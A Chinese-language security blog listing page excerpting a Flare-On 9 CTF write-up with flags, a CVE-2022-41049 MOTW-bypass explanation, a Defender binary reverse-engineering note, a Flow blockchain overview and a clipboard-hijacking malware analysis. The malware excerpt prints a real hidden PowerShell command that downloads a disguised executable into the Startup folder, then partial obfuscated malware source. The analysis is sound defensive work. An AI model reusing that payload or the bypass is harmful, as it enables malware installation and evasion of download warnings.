稍微互動一下就可以發現它其實就是在做 xor encryption，就是會把你輸入的 key 重複貼上直到跟被加密的內容等長，然後做 xor</p>
<p>所以重點就是，要輸入什麼 key?<br>
已知最後面一定是 <code>@flare-on.com</code> 所以可以先解出 key 的最後 13 bytes 是 <code> du etwas Zei</code><br>
然後搭配他在程式裡面塞的一堆提示，就可以找到這首歌 <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=Fpu5a0Bl8eY">NENA | 99 Luftballons [1983] [Offizielles HD Musikvideo]</a><br>
google 一下他的歌詞就會發現第一句歌詞就是 key …<br>
有幾個不是英文字母的在裡面，不過 flag 都是英文，猜一下也還好</p>
<p align="center"><img data-src="/images/10-flag.png" class=" lazyload"  title="flare-on challenge 10 flag"></p>
<p>flag 是 <code>Dann_singe_ich_ein_Lied_fur_dich@flare-on.com</code></p>
<p>p.s. 這題最麻煩的步驟是把 encrypted flag 複製出來…</p>
<h2 id="11-The-challenge-that-shall-not-be-named">11 - The challenge that shall not be named.</h2>
<p>這題是用 python 寫的，用 <a target="_blank" rel="noopener" href="https://github.com/pyinstaller/pyinstaller">pyinstaller</a> 打包成 exe<br>
所以起手先用 <a target="_blank" rel="noopener" href="https://github.com/extremecoders-re/pyinstxtractor">pyinstxtractor</a> 解出原始的 pyc (版本是 3.7.0)<br>
然後再用 <a target="_blank" rel="noopener" href="https://github.com/rocky/python-decompile3">python-decompile3</a> 解回原本的 python source code<br>
接著就會發現他有用 <a target="_blank" rel="noopener" href="https://github.com/dashingsoft/pyarmor">pyarmor</a> 做混淆</p>
<p>直接用 python 去跑解出來的 <code>.py</code> 檔案，會發現它噴了一個錯誤，而且有 stacktrace，位置是在本地的 crypt 函式庫<br>
裡面有用到 linux 平台才有的東西，有點古怪<br>
我就直接去改那個 <code>crypt.py</code>，把 <code>import _crypt</code> 註解掉，然後就會發現他去呼叫 <code>crypt</code> 的時候找不到 <code>_crypt</code>，因為我們沒有 import 他<br>
可以直接讓他 <code>return None</code>，接著就又看到他去呼叫 <code>ARC4</code>，一樣直接改他</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ARC4</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;arc4&#x27;</span>, x)</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self, y</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;arc4.encrypt&#x27;</span>, y)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> A()</span><br></pre></td></tr></table></figure>
<p>然後 flag 就被我們印出來了xD</p>
<p align="center"><img data-src="/images/11-flag.png" class=" lazyload"  title="flare-on challenge 11 flag"></p>
<p>flag 是 <code>Pyth0n_Prot3ction_tuRn3d_Up_t0_11@flare-on.com</code></p>
</div><div class="article-more-container"><a class="article-more button is-small is-size-7" href="/2022/11/12/flare-on-9/zh-tw/#more">Read more</a></div></article></div><div class="card card-readmore"><article class="card-content article" role="article"><div class="article-meta is-size-7 level is-mobile"><div class="level-left"><i class="material-icons">calendar_month</i><span class="level-item"><time dateTime="2022-11-08T16:00:00.000Z" title="11/9/2022, 12:00:00 AM">2022-11-09</time></span><i class="material-icons">schedule</i><span class="level-item">6 minutes</span><i class="material-icons">category</i><span class="level-item"><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/">資安</a></span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/11/09/cve-2022-41049/">【漏洞分析】CVE-2022-41049</a></h1><div class="content"><p>11/08 Windows 的 Patch Tuesday 中修補了兩個關於 Bypass Mark-of-the-Web (MOTW) 的漏洞，分別是 CVE-2022-41049 和 CVE-2022-41091，在 <a target="_blank" rel="noopener" href="https://breakdev.org/zip-motw-bug-analysis/">Exploring ZIP Mark-of-the-Web Bypass Vulnerability (CVE-2022-41049)</a> 這篇部落格中，有詳細的分析這個漏洞的細節，也是本篇部落格主要參考的來源</p>
<p>這個漏洞最早在 6 月在 twitter 上 <a target="_blank" rel="noopener" href="https://twitter.com/wdormann/status/1544411421731160065?s=20&amp;t=mqtK57HVNPv7MghFW7e7dw">Will Dormann 的貼文中</a> 就有提及<br>
並且在 10 月就有在野外觀察到這個漏洞被利用</p>
<h2 id="Alternative-Data-Stream-ADS">Alternative Data Stream (ADS)</h2>
<p>要解釋這個漏洞之前，要先說明一下什麼是 Alternative Data Stream (ADS)<br>
ADS 是 NTFS 檔案系統的一個功能，允許一個檔案可以有多個 Stream，也就是雖然檔名是一樣的，但是透過不同的 Stream 可以存取到不同的資料<br>
比如 <code>test.txt</code> 這個檔案可以有好幾種不同的 Stream</p>
<ul>
<li><code>test.txt::$DATA</code></li>
<li><code>test.txt:Zone.Identifier</code></li>
<li><code>test.txt:Hello</code></li>
<li><code>test.txt:World</code></li>
</ul>
<h2 id="MOTW">MOTW</h2>
<p>瀏覽器會把從網路下載下來的檔案，新增一個 <code>Zone.Identifier</code> 的 Stream，這就是傳說中的 Mark-of-the-Web (MOTW)<br>
我們可以用 Powershell 下指令 <code>Get-Item &lt;filename&gt; -Stream *</code> 來列出某個檔案的所有 Stream 如下圖所示</p>
<p align="center"><img data-src="/images/MOTW.png" class=" lazyload"  title="MOTW"></p>
<p>接著用 <code>Get-Content &lt;filename&gt; -Stream Zone.Identifier</code> 去印出 <code>Zone.Identifier</code> Stream 裡面的資料如下圖所示</p>
<p align="center"><img data-src="/images/Get-Zone-Identifier.png" class=" lazyload"  title="Get-Content Zone.Identifier"></p>
<p>可以看到 <code>Zone.Identifier</code> Stream 裡面存了 <code>ZoneId</code> 和 <code>HostUrl</code> 這些 metadata</p>
<p>那有 MOTW 的檔案可以做什麼?<br>
有 MOTW 的檔案就等於給其他軟體們一個資訊，這個檔案是來自網路，像是 WORD, EXCEL, Visual Studio 等軟體以及 Windows 本身，在處理這些檔案的時候就會格外小心，並且對使用者發出額外的警告，像是如下圖的這些警告</p>
<p align="center"><img data-src="/images/MOTW-Warning.png" class=" lazyload"  title="MOTW Warning"></p>
<h2 id="CVE-2022-41049">CVE-2022-41049</h2>
<p>背景知識都補充足夠了，那這個 CVE-2022-41049 的漏洞又是出了什麼問題<br>
正常情況中，檔案總管 (Explorer) 在解壓縮 zip 的時候，會把 zip 檔案的 MOTW 複製到解壓縮出來的所有檔案上面<br>
但是只要那個 zip 檔案是用某個特別的方法製作的時候，MOTW 就不會被傳遞下去，也就成功 Bypass MOTW</p>
<p>這個特別的製作方法，說起來也不是那麼特別，其實也是正常的 feature<br>
<strong>只要你的檔案在壓縮的時候是 read-only 的</strong><br>
<strong>在解壓縮的時候，因為檔案是 read-only 的關係，所以檔案總管就無法去寫入 MOTW 到解壓縮出的檔案上面</strong><br>
就是這麼簡單，非常簡單就可以實作</p>
<p>這篇 <a target="_blank" rel="noopener" href="https://breakdev.org/zip-motw-bug-analysis/">Exploring ZIP Mark-of-the-Web Bypass Vulnerability (CVE-2022-41049)</a> 部落格中，作者做了非常深入的調查，最後才發現只是這麼簡單的原因，原文分析的思路也推薦大家可以看看<br>
除了 zip，其他的打包格式比如 iso, vhd, gzip 等，也是新的 bypass MOTW 的方法<br>
整體來看，Mark-of-the-Web (MOTW) 其實不算是一個 Security Boundary，比較像是一個額外的警告功能，使用者在下載網路上的資源的時候還是要謹慎小心，多看幾眼xD</p>
<hr>
<ol>
<li><a target="_blank" rel="noopener" href="https://breakdev.org/zip-motw-bug-analysis/">https://breakdev.org/zip-motw-bug-analysis/</a></li>
<li><a target="_blank" rel="noopener" href="https://www.ithome.com.tw/news/154096">https://www.ithome.com.tw/news/154096</a></li>
</ol>
</div><div class="article-more-container"><a class="article-more button is-small is-size-7" href="/2022/11/09/cve-2022-41049/#more">Read more</a></div></article></div><div class="card card-readmore"><article class="card-content article" role="article"><div class="article-meta is-size-7 level is-mobile"><div class="level-left"><i class="material-icons">calendar_month</i><span class="level-item"><time dateTime="2022-10-31T16:00:00.000Z" title="11/1/2022, 12:00:00 AM">2022-11-01</time></span><i class="material-icons">schedule</i><span class="level-item">a minute</span><i class="material-icons">category</i><span class="level-item"><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/">資安</a></span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/11/01/MpDlpCmd/en/">【Windows Security】MpDlpCmd.exe</a></h1><div class="content"><h2 id="MpDlpCmd-exe">MpDlpCmd.exe</h2>
<p>This executable is located under <code>C:\ProgramData\Microsoft\Windows Defender\Platform\v.vv.vvvv.v-v</code><br>
It seems to be related to Data Loss Prevention (DLP).</p>
<p>There is no manual anywhere. Only a short message <code>Usage: MpDlpCmd -&lt;Command&gt;</code><br>
I decided to open IDA Pro to do some reverse engineering.</p>
<p align="center"><img data-src="/images/MpDlpCmd-ida.png" class=" lazyload"  title="MpDlpCmd IDA reverse engineering"></p>
<p>From the decompiled code, we can clearly see that there are three parameters.</p>
<ul>
<li><code>-h / -?</code>: print usage</li>
<li><code>-ShowDlpDetailsDialog</code></li>
<li><code>-TestDlpDetailsDialog</code></li>
</ul>
<h2 id="ShowDlpDetailsDialog">-ShowDlpDetailsDialog</h2>
<p>With <code>-ShowDlpDetailsDialog</code>, there will be error message <code>MpDlpCmd: Failed with hr = 0x80004005.</code>.<br>
Not sure what is happening.</p>
<h2 id="TestDlpDetailsDialog">-TestDlpDetailsDialog</h2>
<p>With <code>-TestDlpDetailsDialog</code>, we can get below window.</p>
<p align="center"><img data-src="/images/MpDlpCmd-TestDlpDetailsDialog.png" class=" lazyload"  title="MpDlpCmd with parameter -TestDlpDetailsDialog"></p>
</div><div class="article-more-container"><a class="article-more button is-small is-size-7" href="/2022/11/01/MpDlpCmd/en/#more">Read more</a></div></article></div><div class="card card-readmore"><article class="card-content article" role="article"><div class="article-meta is-size-7 level is-mobile"><div class="level-left"><i class="material-icons">calendar_month</i><span class="level-item"><time dateTime="2022-03-29T16:00:00.000Z" title="3/30/2022, 12:00:00 AM">2022-03-30</time></span><i class="material-icons">schedule</i><span class="level-item">3 minutes</span><i class="material-icons">category</i><span class="level-item"><a class="link-muted" href="/categories/%E7%A8%8B%E5%BC%8F/">程式</a></span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/03/30/blog03/">【部落格開發日誌】0x03</a></h1><div class="content"><h2 id="部落格要恢復更新啦">部落格要恢復更新啦</h2>
<p>距離上次更新也過了一年多了，期間為了更加客製化主題，還想過要自己從頭刻部落格，真是太天真了啊<br>
最後還是回來用新版的 icarus 主題，真香。<br>
之前是把 icarus 主題跟部落格綁在同個 repo 一起更新，但這樣不好管理，所以現在就直接 <a target="_blank" rel="noopener" href="https://github.com/oalieno/hexo-theme-icarus">fork 一份出來維護</a>，是用最版的 <code>5.0.0-rc.1</code>，之後有新版本就再 merge 進來就好了。把之前做過得一些改動都整合進主題了，還是自己客製化過得最對味啊。<br>
之後會慢慢把之前的文章再放回來，應該至少一週一更吧，希望xD</p>
<h2 id="icarus-大改版">icarus 大改版</h2>
<p>我之前用的 icarus 版本還在寫 <code>.ejs</code><br>
現在已經在寫 <code>.jsx</code> 了<br>
之前的部落格開發日誌上的程式碼有些可能都不能直接套用了<br>
不過不用擔心我現在已經把我改的程式碼推到 <a target="_blank" rel="noopener" href="https://github.com/oalieno/hexo-theme-icarus">這裡</a> 了</p>
<h2 id="Excerpt">Excerpt</h2>
<p>我發現 icarus 的 excerpt 可以寫在文章內容的開頭，而不用寫在 front matter<br>
中間加一個 <code>&lt;!-- more --&gt;</code> 和文章主體區隔<br>
像是下面這樣，或是看<a target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-icarus/blob/site/source/_posts/en/Getting-Started.md?plain=1">這裡範例</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Hello, this is the excerpt</span><br><span class="line"></span><br><span class="line">&lt;!-- more --&gt;</span><br><span class="line"></span><br><span class="line">This is the article</span><br></pre></td></tr></table></figure>
<p>這樣 excerpt 也可以快樂寫 markdown<br>
在首頁也只會顯示到 <code>&lt;!-- more --&gt;</code> 之前的內容<br>
但是點 Read More 的按鈕跳進去文章之後，會發現 excerpt 其實還在<br>
只是頁面會捲動到 <code>#more</code> 這個 hashtag 也就是文章主體的開頭<br>
不過這樣感覺只是一個偷懶的作法，不是一個完美的作法</p>
</div><div class="article-more-container"><a class="article-more button is-small is-size-7" href="/2022/03/30/blog03/#more">Read more</a></div></article></div><div class="card card-readmore"><article class="card-content article" role="article"><div class="article-meta is-size-7 level is-mobile"><div class="level-left"><i class="material-icons">calendar_month</i><span class="level-item"><time dateTime="2021-02-26T16:00:00.000Z" title="2/27/2021, 12:00:00 AM">2021-02-27</time></span><i class="material-icons">schedule</i><span class="level-item">10 minutes</span><i class="material-icons">category</i><span class="level-item"><a class="link-muted" href="/categories/%E5%8D%80%E5%A1%8A%E9%8D%8A/">區塊鍊</a></span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/02/27/flow/">【項目介紹】Flow ( Dapper Labs )</a></h1><div class="content"><p>這個項目算是很新的項目，去年的 9/22 - 10/3 才在第一波 ICO，每人限購 1000 USDC，當時 ICO 的價格是一顆 FLOW 要價 0.1 USDC，到現在也漲了 200 倍了吧，只恨沒有買更多啊 Orz 不過要鎖倉一年，所以要到今年底才拿的回來，但是光是產生的利息就已經回本好幾倍了xD<br>
好了，廢話不多說，下面來介紹一下 flow 的特點。</p>
<h2 id="資源">資源</h2>
<p>這邊先放幾個連結，有興趣入門的可以看一下</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.onflow.org/primer">官方寫的入門文章</a></li>
<li><a target="_blank" rel="noopener" href="https://docs.onflow.org/">官方的文檔</a></li>
<li><a target="_blank" rel="noopener" href="https://joshuahannan.medium.com/taking-your-first-steps-with-cadence-19dde86bbd0">國外大佬的入坑指南</a></li>
</ul>
<h2 id="特點">特點</h2>
<p>Flow 是專門為應用程式以及遊戲所開發的一條新的區塊鍊<br>
在鍊上面可以用 Cadence 這個程式語言撰寫 smart contract，對比隔壁棚的 Ethereum 用 Solidity 寫 smart contract</p>
<h3 id="Cadence-這個程式語言有什麼特點呢">Cadence 這個程式語言有什麼特點呢</h3>
<ul>
<li><strong>Resource-Oriented Programming</strong>
<ul>
<li>聽說是參考 facebook 的 Libra 用的 Move 語言</li>
<li>跟 Rust 的 ownership 很像</li>
<li>可以看看下面兩篇 papers，在講怎麼樣設計一個適合用在 smart contract 上的語言
<ul>
<li><a target="_blank" rel="noopener" href="https://src.acm.org/binaries/content/assets/src/2018/michael-coblenz.pdf">Obsidian: A Safer Blockchain Programming Language</a></li>
<li><a target="_blank" rel="noopener" href="http://www.cs.cmu.edu/~balzers/publications/digital_contracts_as_session_types.pdf">Resource-Aware Session Types for Digital Contracts</a></li>
</ul>
</li>
</ul>
</li>
<li><strong>Upgradable Smart Contract</strong>
<ul>
<li>多了一個 beta state 可以讓你盡情的 upgrade，在這個階段，如果使用這要用就要自行承擔風險囉，話是這樣說的</li>
<li>等到都測試完後，就可以正式 release 了，之後就跟隔壁棚 Ethereum 的 smart contract 一樣就不能再改他了</li>
</ul>
</li>
<li><strong>Built-in Logging Support</strong>
<ul>
<li>只會在 transaction 上標記一個記號，你想要看 log 就自己在離線執行一次就可以看到了，不像隔壁棚 Ethereum 把 log 儲存在鍊上面</li>
<li>在 Cadence 語言中就直接 <code>log(&quot;hi&quot;)</code> 就可以印 log 了，不像隔壁棚 Ethereum 還要先定義 event 再 emit</li>
</ul>
</li>
</ul>
<h3 id="Flow-這條區塊鍊有哪些特點呢">Flow 這條區塊鍊有哪些特點呢</h3>
<ul>
<li><strong>垂直分工 ( pipeline )</strong>，把問題切成四份，某種問題會有一種專門的節點負責處理
<ul>
<li>不像隔壁棚 Ethereum 尋求 sharding 的解決方式，用平行分工把所有交易切成很多子鍊，多了很多問題</li>
<li>分下面四種工作
<ul>
<li>Consensus Nodes    : 共識機制在此發功，Flow 使用 HotStuff 共識機制</li>
<li>Verification Nodes : 檢查正確性，取締違規者</li>
<li>Execution Nodes    : 執行交易附帶的那些計算工作，也就是 smart contract 裡面的程式</li>
<li>Collection Nodes   : 負責包裝交易們處理些雜事，再丟給 Consensus Nodes，用來提昇整體區塊鍊的效率</li>
</ul>
</li>
<li>總而言之
<ul>
<li>Consensus 和 Verification 這兩種 Node 是安全守門員負責讓 Flow 更安全</li>
<li>Execution 和 Collection 這兩種 Node 是瘋狂機器人負責讓 Flow 更有效率跑得更快</li>
</ul>
</li>
</ul>
</li>
<li>每個帳號裡面都可以有多個 smart contract，不像隔壁棚 Ethereum 的 smart contract 和 address 是一對一的關係</li>
<li>內建支援 <strong>multi-signature</strong>，每個 key 會有一個 weight，只有你提供的 key 們的 weight 加起來有 1000 就可以做事情了</li>
<li>聽官網介紹是說有<strong>帳號恢復機制</strong>，不清楚細節</li>
<li>強調說他遵守了資料庫系統的 ACID ( Atomic, Consistent, Isolated, and Durable ) 原則，因為根本上區塊鍊就是一個去中心化的資料庫</li>
</ul>
<h2 id="如何成為節點">如何成為節點</h2>
<p><a target="_blank" rel="noopener" href="https://docs.onflow.org/node-operation/node-setup">官方的文檔 - Setting Up a Flow Node</a></p>
<table>
<thead>
<tr>
<th>NODE TYPE</th>
<th>CPU</th>
<th>MEMORY</th>
<th>DISK</th>
</tr>
</thead>
<tbody>
<tr>
<td>Collection</td>
<td>2 cores</td>
<td>16 GB</td>
<td>200 GB</td>
</tr>
<tr>
<td>Consensus</td>
<td>2 coresv</td>
<td>16 GB</td>
<td>200 GB</td>
</tr>
<tr>
<td>Execution</td>
<td>16 cores</td>
<td>128 GB</td>
<td>2 TB</td>
</tr>
<tr>
<td>Verification</td>
<td>2 cores</td>
<td>16 GB</td>
<td>200 GB</td>
</tr>
<tr>
<td>Access</td>
<td>2 cores</td>
<td>16 GB</td>
<td>200 GB</td>
</tr>
</tbody>
</table>
<blockquote>
<p>Make sure you have a sufficiently fast connection; we recommend at least 1Gbps, and 5Gbps is better.</p>
</blockquote>
<p>硬體要求還行，我的桌機好像還能跑，但是這個網速要求有點高啊<br>
而且還要填<a target="_blank" rel="noopener" href="https://www.onflow.org/node-validators">表單</a>申請，太中心化了啊<br>
然後<a target="_blank" rel="noopener" href="https://docs.onflow.org/node-operation/node-roles">這裡</a>有寫每種 node 要跑得話要 stake 多少顆 flow，最便宜也至少要 stake 135000 顆 flow，以目前的價格來看大概是 270 萬美金吧，我去</p>
<h2 id="Flow-目前的一些問題">Flow 目前的一些問題</h2>
<p>目前 Flow 還在初期階段，有些東西還沒搞好<br>
下面一些資訊是我在 discord 群看到的</p>
<blockquote>
<p>we still have a lot of things locked down in mainnet right now. The ability to create accounts is one of them. At this time only partnered wallets can create accounts. This will obviously be opened up in the future. At a minimum it won’t happen until fees are in place on mainnet.</p>
<ul>
<li>qvvg on discord</li>
</ul>
</blockquote>
<p>主網路還沒好啊，不能隨意創帳號<br>
需要他們合作的夥伴像是 blockto 才能創，可以用 <a target="_blank" rel="noopener" href="https://port.onflow.org/">https://port.onflow.org/</a> 這個創帳號的樣子<br>
還不夠去中心化啊</p>
<blockquote>
<p>Flow’s fee model is still under development, but will have transaction fees. The payer of a transaction can be separate from the authorizer, so dapps can easily pay for their users transactions. Flow keeps tx fees affordable and accessible for all.</p>
<ul>
<li>Flow Assistant Bot on discord</li>
</ul>
</blockquote>
<p>手續費的機制也還沒弄好啊</p>
<blockquote>
<p>Flow is an decentralized protocol being built in an open ecosystem - there is no formal roadmap but if you’d like to see areas people are currently expending effort you can take a look at issues currently in the GitHub repo <a target="_blank" rel="noopener" href="https://github.com/onflow/flow/issues">https://github.com/onflow/flow/issues</a> and feel free to create or comment on issues for anything that you think should exist on Flow.</p>
<ul>
<li>Flow Assistant Bot on discord</li>
</ul>
</blockquote>
<p>沒有正式的 roadmap</p>
<h2 id="Flow-的應用">Flow 的應用</h2>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.nbatopshot.com/">NBA Top Shot</a>: NBA 主題的 NFT，可以讓你收藏你最愛的球員，以及他們得分的片段等</li>
<li><a target="_blank" rel="noopener" href="https://viv3.com/">VIV3</a>: 買賣 NFT 的平台</li>
<li><a target="_blank" rel="noopener" href="https://motogp-ignition.com/">MotoGP™ Ignition</a>: 類似 Ethereum 上的 <a target="_blank" rel="noopener" href="https://www.f1deltatime.com/">F1® Delta Time</a>，同一批開發人員的樣子，只是從 F1 賽車改成 MotoGP 摩托車，可以組裝自己的車車然後跟別人比賽，下個月 3/26 開賣</li>
<li><a target="_blank" rel="noopener" href="https://www.cryptokitties.co/">CryptoKitties</a>: 還在計畫從 Ethereum 遷移到 Flow，不知道是哪時候</li>
</ul>
<h2 id="總結">總結</h2>
<p>Flow 提出了很多方案來改進去中心化應用面臨到的問題，接下來就要靜待時間的考驗，等潮水退了就知道 Flow 有沒有穿褲子了</p>
<h2 id="Flow-to-the-Moon-🚀"><strong>Flow to the Moon 🚀</strong></h2>
</div><div class="article-more-container"><a class="article-more button is-small is-size-7" href="/2021/02/27/flow/#more">Read more</a></div></article></div><div class="card card-readmore"><article class="card-content article" role="article"><div class="article-meta is-size-7 level is-mobile"><div class="level-left"><i class="material-icons">calendar_month</i><span class="level-item"><time dateTime="2020-08-15T16:00:00.000Z" title="8/16/2020, 12:00:00 AM">2020-08-16</time></span><i class="material-icons">schedule</i><span class="level-item">7 minutes</span><i class="material-icons">category</i><span class="level-item"><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/">資安</a></span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/08/16/clipboard-hijack/">Clipboard hijacking cryptocurrency malware on tradingview.com</a></h1><div class="content"><p>最近在 <a target="_blank" rel="noopener" href="http://tradingview.com">tradingview.com</a> 上面看到這篇 Idea <a target="_blank" rel="noopener" href="https://www.tradingview.com/chart/EOSUSDT/SDsMZhix-EOS-footprints-of-institutional-money/">EOS - footprints of institutional money</a>，看起來像是正常的分析趨勢走向的 Idea，但是下面留言有一個連結 <code>mycryptorush.com/signals</code>，說是可以得到免費的 bitcoin 和交易趨勢訊號。</p>
<p align="center"><img data-src="/images/clipboard-hijack-1.png" class=" lazyload"  title="tradingview idea"></p>
<p>點下去其實是導向 <code>tinyurl.com/cryptorushsignals</code>，這個短網址又是導向 <code>https://bbuseruploads.s3.amazonaws.com/7e1f7e0b...</code>，會下載 <code>CryptoRushSignals.zip</code> 下來。看起來就很可疑，明明看起來是要去一個網站，卻載了檔案下來。解壓縮該 zip 檔之後有兩個檔案 <code>HOWTOUSE.txt</code> 和 <code>CryptoRushSignals.run.lnk</code>。</p>
<figure class="highlight plaintext"><figcaption><span>HOWTOUSE.txt</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Open CryptoRushSignals.run, this will open up a website were you can register.</span><br><span class="line">It then automatically will open up an excel sheet with the live current signals.</span><br></pre></td></tr></table></figure>
<p>純文字的說明文件，叫你執行 <code>CryptoRushSignals.run</code>，真的去執行之後，會跳出瀏覽器瀏覽 <code>https://t.me/MyCryptoradar</code>，讓你加入一個 telegram 群組，就可以收到一些指標數據的變化通知，裡面現在有 400 多人。</p>
<p align="center"><img data-src="/images/clipboard-hijack-2.png" class=" lazyload"  title="tradingview idea"></p>
<p>除了打開瀏覽器叫你加群組之外，他還秘密執行了下面這段 payload</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe&quot;</span> <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> [<span class="type">System.Net.ServicePointManager</span>]::SecurityProtocol = [<span class="type">System.Net.SecurityProtocolType</span>]::Tls12; <span class="built_in">Start-Process</span> <span class="literal">-FilePath</span> <span class="string">&quot;https://t.me/MyCryptoradar; Invoke-WebRequest -Uri &quot;</span>https://bitbucket.org/cryptorushh/cryptorush/downloads/pcmoni.png<span class="string">&quot; -OutFile C:\Users\<span class="variable">$env:UserName</span>\AppData\Roaming\Microsoft\Windows\Start` Menu\Programs\Startup\pclp.exe</span></span><br></pre></td></tr></table></figure>
<p>基本上就是去 bitbucket 下載 <code>https://bitbucket.org/cryptorushh/cryptorush/downloads/pcmoni.png</code> 這個 png，然後放到開機自動執行的路徑，而且這個也不是 png，他就是一隻 PE 執行檔。</p>
<p align="center"><img data-src="/images/clipboard-hijack-3.png" class=" lazyload"  title="tradingview idea"></p>
<p>稍微看一下那隻 PE 執行檔後，發現他是用 py2exe 包的，那就用 <a target="_blank" rel="noopener" href="https://github.com/matiasb/unpy2exe">unpy2exe</a> 拆回 pyc，再用 <a target="_blank" rel="noopener" href="https://github.com/rocky/python-uncompyle6">uncompyle6</a> 就可以拆出原本的 python script 了。</p>
<figure class="highlight python"><figcaption><span>8.61.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.7.2</span></span><br><span class="line"><span class="comment"># Python bytecode 2.7 (62211)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 2.7.15 (default, Dec 23 2019, 14:00:59) </span></span><br><span class="line"><span class="comment"># [GCC 4.2.1 Compatible Apple LLVM 10.0.1 (clang-1001.0.46.4)]</span></span><br><span class="line"><span class="comment"># Embedded file name: 8.61.py</span></span><br><span class="line"><span class="comment"># Compiled at: 2020-08-15 23:23:49</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">oo000 = sys.version_info[<span class="number">0</span>] == <span class="number">2</span></span><br><span class="line">ii = <span class="number">2048</span></span><br><span class="line">oOOo = <span class="number">7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">O0</span>(<span class="params">ll_opy_</span>):</span><br><span class="line">    o0O = <span class="built_in">ord</span>(ll_opy_[(-<span class="number">1</span>)])</span><br><span class="line">    iI11I1II1I1I = ll_opy_[:-<span class="number">1</span>]</span><br><span class="line">    oooo = o0O % <span class="built_in">len</span>(iI11I1II1I1I)</span><br><span class="line">    iIIii1IIi = iI11I1II1I1I[:oooo] + iI11I1II1I1I[oooo:]</span><br><span class="line">    <span class="keyword">if</span> oo000:</span><br><span class="line">        o0OO00 = unicode().join([ unichr(<span class="built_in">ord</span>(oo) - ii - (i1iII1IiiIiI1 + o0O) % oOOo) <span class="keyword">for</span> i1iII1IiiIiI1, oo <span class="keyword">in</span> <span class="built_in">enumerate</span>(iIIii1IIi) ])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        o0OO00 = <span class="built_in">str</span>().join([ <span class="built_in">chr</span>(<span class="built_in">ord</span>(oo) - ii - (i1iII1IiiIiI1 + o0O) % oOOo) <span class="keyword">for</span> i1iII1IiiIiI1, oo <span class="keyword">in</span> <span class="built_in">enumerate</span>(iIIii1IIi) ])</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(o0OO00)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time, re, pyperclip, subprocess</span><br><span class="line"><span class="keyword">if</span> <span class="number">0</span>:</span><br><span class="line">    ooOoO0O00 * IIiIiII11i</span><br><span class="line"><span class="keyword">if</span> <span class="number">0</span>:</span><br><span class="line">    oOo0O0Ooo * I1ii11iIi11i</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">I1IiI</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="number">0</span> &lt; <span class="number">1</span>:</span><br><span class="line">        <span 